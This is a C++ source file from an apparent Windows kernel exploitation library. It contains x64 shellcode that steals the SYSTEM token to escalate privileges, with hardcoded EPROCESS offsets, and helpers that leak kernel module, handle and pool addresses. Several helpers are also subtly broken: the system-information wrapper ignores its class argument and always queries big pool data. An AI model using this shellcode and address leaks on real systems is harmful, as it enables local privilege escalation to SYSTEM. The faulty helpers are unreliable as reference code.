#include "kernel.hpp"

#include <stdexcept>

#include "asm.hpp"
#include "log.hpp"
#include "nt.hpp"

#pragma comment(lib, "ntdll.lib")

using namespace pwn::log;


#ifndef __KERNEL_CONSTANTS__
#define __KERNEL_CONSTANTS__

// clang-format off
// TODO: use a json file with those autogen values at compile time
#if PWN_BUILD_FOR_WINDOWS == 10
//
// Offset for Win10 RS6 x64
//
#  define CURRENT_ETHREAD       0x0188
#  define EPROCESS_OFFSET       0x00b8
#  define PROCESSID_OFFSET      0x02e8
#  define EPROCESS_FLINK_OFFSET 0x02f0
#  define TOKEN_OFFSET          0x0360
#  define SYSTEM_PID            4


#elif PWN_BUILD_FOR_WINDOWS == 81
#  define CURRENT_ETHREAD      0x0188
#  define EPROCESS_OFFSET      0x00b8
#  define PROCESSID_OFFSET     0x02e0
#  define FLINK_OFFSET         0x02e8
#  define TOKEN_OFFSET         0x0348
#  define SYSTEM_PID           0x4

#else
#error "unsupported os"
#endif

#endif
// clang-format on


namespace pwn::win::kernel
{
namespace shellcode
{
namespace
{

auto
__steal_system_token_x64() -> std::vector<u8>
{
#ifdef PWN_HAS_ASSEMBLER
    const char* sc = ""
					"push rax ;"
					"push rbx ;"
					"push rcx ;"
					// nt!PsGetCurrentProcess
					"mov rax, gs:[" STR(CURRENT_ETHREAD) "] ;"
					"mov rax, [rax+" STR(EPROCESS_OFFSET) "] ;"
					"mov rbx, rax ;"
					"mov rbx, [rbx+" STR(EPROCESS_FLINK_OFFSET) "] ;"
					// look for SYSTEM EProcess
					"__loop: "
					"sub rbx, " STR(EPROCESS_FLINK_OFFSET) " ;"
					"mov rcx, [rbx+" STR(PROCESSID_OFFSET) "] ;"
					"cmp rcx, " STR(SYSTEM_PID) " ;"
					"jnz __loop ;"
					// get its token value
					"mov rcx, [rbx + " STR(TOKEN_OFFSET) "] ;"
					"and cl, 0xf0 ;"
					// overwrite our current process' token with it
					"mov [rax + " STR(TOKEN_OFFSET) "], rcx ;"
					"pop rcx ;"
					"pop rbx ;"
					"pop rax ;"
					"add rsp, 0x28 ;"
					"xor rax, rax ;"
					"ret ;";

    const size_t sclen = ::strlen(sc);
    std::vector<u8> out;
    if ( pwn::assm::x64(sc, sclen, out) == 0 )
    {
        throw std::runtime_error("failed to compile shellcode\n");
    }
    return out;

#else
    throw std::exception("This library wasn't compiled with assembly support");
#endif
}
} // namespace


auto
debug_break() -> std::vector<u8>
{
    return std::vector<u8>({0x90, 0x90, 0xcc, 0xcc});
}


auto
steal_system_token() -> std::vector<u8>
{
#ifdef __x86_64__
    return __steal_system_token_x64();
#else
    return debug_break();
#endif
}


} // namespace shellcode


auto
query_system_info(_In_ SYSTEM_INFORMATION_CLASS code, _Out_ size_t* pdwBufferLength) -> std::unique_ptr<u8[]>
{
    NTSTATUS Status;
    ULONG BufferLength = 0;
    ULONG ExpectedBufferLength;
    std::unique_ptr<u8[]> Buffer;

    *pdwBufferLength = 1;

    do
    {
        Buffer = std::make_unique<u8[]>(BufferLength);
        Status =
            ::NtQuerySystemInformation(SystemBigPoolInformation, Buffer.get(), BufferLength, &ExpectedBufferLength);

        if ( !NT_SUCCESS(Status) )
        {
            if ( Status == STATUS_INFO_LENGTH_MISMATCH )
            {
                BufferLength = ExpectedBufferLength;
                continue;
            }

            break;
        }

        break;
    } while ( true );

    if ( !NT_SUCCESS(Status) )
    {
        ::SetLastError(::RtlNtStatusToDosError(Status));
        return nullptr;
    }

    *pdwBufferLength = ExpectedBufferLength;
    return Buffer;
}


/*++
Description:
    Get an iterable of tuple enumerating all the kernel modules, with their base address

Arguments:
    None

Return:
    Returns a vector of <wstring,uptr> of all the modules
--*/
auto
modules() -> std::vector<std::tuple<std::wstring, uptr> >
{
    std::vector<std::tuple<std::wstring, uptr> > mods;

    SIZE_T BufferLength;
    auto Buffer = query_system_info(SystemModuleInformation, &BufferLength);
    if ( !Buffer )
    {
        throw std::runtime_error("NtQuerySystemInformation()");
    }

    auto Modules = reinterpret_cast<PRTL_PROCESS_MODULES>(Buffer.get());
    dbg(L"Found %lu modules\n", Modules->NumberOfModules);

    for ( DWORD i = 0; i < Modules->NumberOfModules; i++ )
    {
        auto ModuleFullPathName              = pwn::utils::to_widestring((const char*)Modules->Modules[i].FullPathName);
        std::tuple<std::wstring, uptr> entry = std::make_tuple(ModuleFullPathName, (uptr)Modules->Modules[i].ImageBase);
        mods.push_back(entry);
    }

    return mods;
}


/*++
Description:
    Get the kernel module argument passed in argument base address.

Arguments:
    - lpwszModuleName is a wide string for the name of the module to look up

Return:
    Returns -1 on error, the address of the module on success
--*/
auto
get_module_base_address(_In_ const std::wstring& ModuleName) -> uptr
{
    std::wstring pattern(ModuleName);

    for ( auto& mod : modules() )
    {
        auto name = std::get<0>(mod);
        auto addr = std::get<1>(mod);

        if ( pwn::utils::endswith(name, pattern) != 0 )
        {
            dbg(L"Found %s base (%p)\n", pattern.c_str(), addr);
            return addr;
            break;
        }
    }

    ::SetLastError(ERROR_NOT_FOUND);
    return (uptr)-1;
}


/*++
Description:
    Get the kernel address for the given handle number and PID.

Arguments:
    - hTarget is the handle number
    - dwPid is the process with that handle

Return:
    Returns -1 on error (sets last error), the kernel address of the handle
--*/
auto
get_handle_kernel_address(_In_ HANDLE hTarget, _In_ u32 dwPid) -> uptr
{
    SIZE_T BufferLength;
    auto Buffer = query_system_info(SystemHandleInformation, &BufferLength);
    if ( !Buffer )
    {
        throw std::runtime_error("NtQuerySystemInformation()");
    }

    auto HandleTableInfo = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(Buffer.get());

    dbg(L"Dumped %d entries\n", HandleTableInfo->NumberOfHandles);
    for ( ULONG i = 0; i < HandleTableInfo->NumberOfHandles; i++ )
    {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO HandleInfo = HandleTableInfo->Handles[i];

        if ( HandleInfo.UniqueProcessId == dwPid && (HANDLE)HandleInfo.HandleValue == hTarget )
        {
            dbg(L"Found HANDLE=%d OBJECT=%p\n", HandleInfo.HandleValue, HandleInfo.Object);
            return (uptr)HandleInfo.Object;
        }
    }

    ::SetLastError(ERROR_NOT_FOUND);
    return (uptr)-1;
}


/*++
Description:
    Get a vector of big pool chunks with the specified Tag

Arguments:
    - Tag is a DWORD of the big pool tag to search for. If 0, all big pool chunks are returned.

Return:
    A vector with the big pool kernel address with the specified tag
--*/
auto
get_big_pool_kaddress(_In_ u32 Tag) -> std::vector<uptr>
{
    std::vector<uptr> res;

    SIZE_T BufferLength;
    auto Buffer = query_system_info(SystemBigPoolInformation, &BufferLength);
    if ( !Buffer || BufferLength < 8 )
    {
        throw new std::runtime_error("NtQuerySystemInformation()");
    }

    u32 PoolTableSize  = static_cast<u32>((BufferLength - 8) / sizeof(BIG_POOL_INFO));
    auto PoolTableInfo = reinterpret_cast<PBIG_POOL_INFO>(Buffer.get() + 8);

    for ( u32 i = 0; i < PoolTableSize; i++ )
    {
        auto PoolInfo = reinterpret_cast<PBIG_POOL_INFO>(&PoolTableInfo[i]);

        if ( Tag == 0 || PoolInfo->PoolTag == Tag )
        {
            dbg(L"Found PoolTag 0x%x at %p\n", PoolInfo->PoolTag, PoolInfo->Address);
            res.push_back(PoolInfo->Address);
        }
    }

    return res;
}

} // namespace pwn::win::kernel
